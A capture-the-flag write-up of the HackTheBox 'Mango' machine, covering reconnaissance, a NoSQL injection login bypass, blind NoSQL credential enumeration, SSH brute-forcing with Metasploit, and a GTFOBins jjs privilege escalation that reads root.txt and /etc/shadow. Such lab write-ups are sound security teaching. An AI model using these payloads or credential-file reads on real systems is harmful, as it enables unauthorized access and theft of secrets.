@@ -1,0 +1,210 @@
+I"�<<p><strong><center>Ref°: HTB-04-Boot2Root</center></strong></p>
+
+<p><img src="/assets/images/mango/HTB-Badge-Mango.png" alt="Desktop View" /></p>
+
+<p>— Mango is a Linux machine that highlights web enumeration through a certificate and NoSQL injection on unsecure login page, to discover credentials in MongoDB database with Blind method. That to get User Flag.</p>
+
+<p>SGID file is present under Admin user and allow to run jjs under root permission. We use GTFOBin on this unix binaries to read our root.txt and get Root Flag.</p>
+
+<p><img src="/assets/images/mango/HTB-Information-Mango.png" alt="Desktop View" /></p>
+
+<h2 id="1-discovery---figure-out-environment"><strong><span style="color:#c0392b">[1] Discovery - Figure out environment</span></strong></h2>
+<h3 id="check-all-services">Check all services</h3>
+<hr />
+<p>The nmap scan reveals <code class="language-plaintext highlighter-rouge">SSH</code> and <code class="language-plaintext highlighter-rouge">Apache</code> to be running on their usual ports; <code class="language-plaintext highlighter-rouge">22</code>, <code class="language-plaintext highlighter-rouge">80</code> and <code class="language-plaintext highlighter-rouge">443</code>.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-A</span> <span class="nt">-T5</span> 10.10.10.162 <span class="nt">-p-</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/mango/HTB-Images-Mango-nmap.png" alt="Desktop View" /></p>
+
+<h3 id="web">Web</h3>
+<hr />
+<p><strong>Port 80 :</strong> We have no permission to access of this ressource from the ip address.</p>
+
+<p><img src="/assets/images/mango/HTB-Images-Mango-web80.png" alt="Desktop View" /></p>
+
+<p><strong>Port 443 :</strong> We have a webpage search / analytics.</p>
+
+<p><img src="/assets/images/mango/HTB-Images-Mango-web443.png" alt="Desktop View" /></p>
+
+<p>And certificate alert. Let’s check this and find something interesting.</p>
+
+<p><img src="/assets/images/mango/HTB-Images-Mango-webcertificate.png" alt="Desktop View" /></p>
+
+<p>This certificate is delivery for CN <code class="language-plaintext highlighter-rouge">staging-order.mango.htb</code>. Let’s change our hosts file to see what the answer is behind are.</p>
+
+<p><img src="/assets/images/mango/HTB-Images-Mango-host.png" alt="Desktop View" /></p>
+
+<p>Nothing on the port 443, but we have now a unsecure login page appear on port 80.</p>
+
+<p><img src="/assets/images/mango/HTB-Images-Mango-secretwebpage.png" alt="Desktop View" /></p>
+
+<p><img src="/assets/images/mango/HTB-Images-Mango-unsecurelogins.png" alt="Desktop View" /></p>
+
+<p>We use Burp Suite to see how login and password are injects in the form.</p>
+
+<p><img src="/assets/images/mango/HTB-Images-Mango-burp.png" alt="Desktop View" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username=admin&amp;password=test&amp;login=login
+</code></pre></div></div>
+
+<p>After many research, we have a NoSQL Database behind (MongoDB = Mango ?).</p>
+
+<p><img src="/assets/images/mango/HTB-Images-Mango-schema.png" alt="Desktop View" /></p>
+
+<h3 id="vulnerabilities">Vulnerabilities</h3>
+<hr />
+<p>Here our target is MongoDB. This database structure is vulnerable of many injections like authentication bypass or blindnosql.</p>
+
+<p>Reference - all injection with mongo : <a href="https://nullsweep.com/a-nosql-injection-primer-with-mongo/">https://nullsweep.com/a-nosql-injection-primer-with-mongo/</a></p>
+
+<h2 id="2-foothold---get-into-the-target-"><strong><span style="color:#c0392b">[2] Foothold - Get into the target </span></strong></h2>
+<h3 id="bypassing-authentication-with-nosql-injection">Bypassing Authentication with NoSQL Injection</h3>
+<hr />
+<p>We bypass the login page to see if we have something interesting.</p>
+
+<p>Reference - toolbox NoSql Injection : <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/">https://github.com/swisskyrepo/PayloadsAllTheThings/</a></p>
+
+<p>We inject during the interception with Burp a not equal [$ne] in the username and password.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username[$ne]=admin&amp;password[$ne]=test&amp;login=login
+</code></pre></div></div>
+
+<p><img src="/assets/images/mango/HTB-Images-Mango-burpexploit.png" alt="Desktop View" /></p>
+
+<p>After disabled the interception, we bypass the authentication and we are redirected to a new page <code class="language-plaintext highlighter-rouge">home.php</code>.
+This page is interesting because we know now our first user –&gt; <code class="language-plaintext highlighter-rouge">admin@mango.htb</code></p>
+
+<p><img src="/assets/images/mango/HTB-Images-Mango-maintenancepage.png" alt="Desktop View" /></p>
+
+<p>But that’s not enough to gain our first level access on the target.</p>
+
+<h3 id="blind-nosql-exploitation">Blind NoSQL exploitation</h3>
+<hr />
+<p>This type of database still vulnerable of other injection method like blind NoSQL which give the possibility to find any information in the database. In order to do this we proceed by brute-force, and more precisely by efficient brute-force.</p>
+
+<p>Reference - blind sql injection : <a href="https://zestedesavoir.com/tutoriels/945/les-injections-sql-le-tutoriel/les-injections-sql-en-aveugle/blind-sql-injection/">https://zestedesavoir.com/tutoriels/945/les-injections-sql-le-tutoriel/les-injections-sql-en-aveugle/blind-sql-injection/</a></p>
+
+<p>What is this technique ? “This injection is a bit of a guessing game: the person you are asking can only answer yes or no. It would therefore require a certain number of questions before finding the information you want, unlike a “classic” query that would return the result directly.”</p>
+
+<p>What is the difference between efficient and pure brute-force ? “The pure brute-force is to test all combinations by asking if it is equal to, the efficient brute-force is to ask if the searched string begins with or if the ne letter is: we don’t test the whole set but a part of it, which considerably reduces the number of queries to perform.”</p>
+
+<p>I found a script to brute-force a usernames and passwords values through this technique.</p>
+
+<p>References - script :</p>
+<ul>
+  <li><a href="https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration">https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration</a></li>
+  <li><a href="https://book.hacktricks.xyz/pentesting-web/nosql-injection">https://book.hacktricks.xyz/pentesting-web/nosql-injection</a></li>
+</ul>
+
+<p>We can see how work the efficient brute-force :</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>python nosqli-user-pass-enum.py <span class="nt">-u</span> http://staging-order.mango.htb/index.php <span class="nt">-up</span> username <span class="nt">-pp</span> password <span class="nt">-ep</span> username <span class="nt">-op</span> login:login
+</code></pre></div></div>
+
+<p><img src="/assets/images/mango/HTB-Images-Mango-blindnosql.png" alt="Desktop View" /></p>
+
+<p><img src="/assets/images/mango/HTB-Images-Mango-blindnosqlusers.png" alt="Desktop View" /></p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>python nosqli-user-pass-enum.py <span class="nt">-u</span> http://staging-order.mango.htb/index.php <span class="nt">-up</span> username <span class="nt">-pp</span> password <span class="nt">-ep</span> password <span class="nt">-op</span> login:login
+</code></pre></div></div>
+
+<p><img src="/assets/images/mango/HTB-Images-Mango-blindnosqlpasswd.png" alt="Desktop View" /></p>
+
+<p>We have 2 users 2 passwords, and 1 service ssh not yet exploited.</p>
+
+<p>To avoid the testing one by one, i create a user and password files to test it in metasploit with <code class="language-plaintext highlighter-rouge">ssh_login module</code>.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>msfconsole
+<span class="gp">msf5 &gt;</span><span class="w"> </span>use auxiliary/scanner/ssh/ssh_login
+<span class="gp">msf5 auxiliary(scanner/ssh/ssh_login) &gt;</span><span class="w"> </span><span class="nb">set </span>rhost 10.10.10.162
+<span class="gp">msf5 auxiliary(scanner/ssh/ssh_login) &gt;</span><span class="w"> </span><span class="nb">set </span>user_file /[...]/users.txt
+<span class="gp">msf5 auxiliary(scanner/ssh/ssh_login) &gt;</span><span class="w"> </span><span class="nb">set </span>user_file /[...]/passwords.txt
+<span class="gp">msf5 auxiliary(scanner/ssh/ssh_login) &gt;</span><span class="w"> </span>exploit
+</code></pre></div></div>
+<p><img src="/assets/images/mango/HTB-Images-Mango-credentialsfoothold.png" alt="Desktop View" /></p>
+
+<p>And we can connect now from ssh :</p>
+
+<p><img src="/assets/images/mango/HTB-Images-Mango-credentialsunderssh.png" alt="Desktop View" /></p>
+
+<p>The exploitation is successful and we have gained a foothold with the credential <code class="language-plaintext highlighter-rouge">mango / h3mXK8RhU~f{]f5H</code></p>
+
+<p>We flag the user to validate the compromission of the system user.</p>
+
+<h2 id="3-lateral-movement---move-through-environment"><strong><span style="color:#c0392b">[3] Lateral Movement - Move through environment</span></strong></h2>
+<h3 id="local-su-login">Local SU login</h3>
+<hr />
+<p>The second user (found above : <code class="language-plaintext highlighter-rouge">admin / t9KcS3&gt;!0B#2</code>) is not allowed to connect to ssh, but like Postman Machine we can connect with command su.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>mango@mango:~<span class="nv">$ </span>su admin
+</code></pre></div></div>
+
+<p><img src="/assets/images/mango/HTB-Images-Mango-adminaccount.png" alt="Desktop View" /></p>
+
+<h2 id="4-privilege-escalation---gain-higher-level-permissions"><strong><span style="color:#c0392b">[4] Privilege Escalation - Gain higher-level permissions</span></strong></h2>
+<h3 id="gtfobins-abuse">GTFOBins abuse</h3>
+<hr />
+<p>We enum with LinPEAS tool on Admin account to find anything to escalate our privilege.</p>
+
+<p>Reference - linPEAS tool : <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS</a></p>
+
+<p>We transfert the tool on the machine.</p>
+
+<p><img src="/assets/images/mango/HTB-Images-Mango-transfertlinPEAS.png" alt="Desktop View" /></p>
+
+<p>And we find interesting SGID files like <code class="language-plaintext highlighter-rouge">/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs</code></p>
+
+<p><img src="/assets/images/mango/HTB-Images-Mango-sgid.png" alt="Desktop View" /></p>
+
+<p>We can find the same thing with Linenum tool.</p>
+
+<p><img src="/assets/images/mango/HTB-Images-Mango-sgidbis.png" alt="Desktop View" /></p>
+
+<p>This command need to be execute under Admin user. And after some research, the jjs is present in GTFOBin database. So we can exploit it.</p>
+
+<p>We have much possibility with this unix binaries. We can read, write, push reverse shell, get shell, etc. under root permission. But we’re not gonna execute them all.
+We’re just going to read our root.txt and shadow file to see.</p>
+
+<p>Reference - jjs GTFOBin : <a href="https://gtfobins.github.io/gtfobins/jjs/">https://gtfobins.github.io/gtfobins/jjs/</a></p>
+
+<p>We use the code to read file root.txt. So to realize this, we replace <code class="language-plaintext highlighter-rouge">file_to_read</code> by <code class="language-plaintext highlighter-rouge">root/root.txt</code> and grab the flag value !</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo 'var BufferedReader = Java.type("java.io.BufferedReader");
+var FileReader = Java.type("java.io.FileReader");
+var br = new BufferedReader(new FileReader("file_to_read"));
+while ((line = br.readLine()) != null) { print(line); }' | jjs
+</code></pre></div></div>
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">cd</span> /usr/lib/jvm/java-11-openjdk-amd64/bin/
+<span class="gp">$</span><span class="w"> </span>jjs
+<span class="gp">jjs&gt;</span><span class="w"> </span>var BufferedReader <span class="o">=</span> Java.type<span class="o">(</span><span class="s2">"java.io.BufferedReader"</span><span class="o">)</span><span class="p">;</span>
+<span class="gp">jjs&gt;</span><span class="w"> </span>var FileReader <span class="o">=</span> Java.type<span class="o">(</span><span class="s2">"java.io.FileReader"</span><span class="o">)</span><span class="p">;</span>
+<span class="gp">jjs&gt;</span><span class="w"> </span>var br <span class="o">=</span> new BufferedReader<span class="o">(</span>new FileReader<span class="o">(</span><span class="s2">"/root/root.txt"</span><span class="o">))</span><span class="p">;</span>
+<span class="gp">jjs&gt;</span><span class="w"> </span><span class="k">while</span> <span class="o">((</span>line <span class="o">=</span> br.readLine<span class="o">())</span> <span class="o">!=</span> null<span class="o">)</span> <span class="o">{</span> print<span class="o">(</span>line<span class="o">)</span><span class="p">;</span> <span class="o">}</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/mango/HTB-Images-Mango-jjsflag.png" alt="Desktop View" /></p>
+
+<p>We can too read the shadow file to confirm the privilege escalation from this method.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">jjs&gt;</span><span class="w"> </span>var BufferedReader <span class="o">=</span> Java.type<span class="o">(</span><span class="s2">"java.io.BufferedReader"</span><span class="o">)</span><span class="p">;</span>
+<span class="gp">jjs&gt;</span><span class="w"> </span>var FileReader <span class="o">=</span> Java.type<span class="o">(</span><span class="s2">"java.io.FileReader"</span><span class="o">)</span><span class="p">;</span>
+<span class="gp">jjs&gt;</span><span class="w"> </span>var br <span class="o">=</span> new BufferedReader<span class="o">(</span>new FileReader<span class="o">(</span><span class="s2">"/etc/shadow"</span><span class="o">))</span><span class="p">;</span>
+<span class="gp">jjs&gt;</span><span class="w"> </span><span class="k">while</span> <span class="o">((</span>line <span class="o">=</span> br.readLine<span class="o">())</span> <span class="o">!=</span> null<span class="o">)</span> <span class="o">{</span> print<span class="o">(</span>line<span class="o">)</span><span class="p">;</span> <span class="o">}</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/mango/HTB-Images-Mango-jjsreadshadowfile.png" alt="Desktop View" /></p>
+
+<p>So we can go much further in the control of our target.</p>
+
+<hr />
+
+<h2 id="trophy"><strong><center>Trophy</center></strong></h2>
+
+<blockquote>
+  <p><strong>It does not matter how slowly you go as long as you do not stop.</strong></p>
+
+  <p>Confucius</p>
+</blockquote>
+:ET
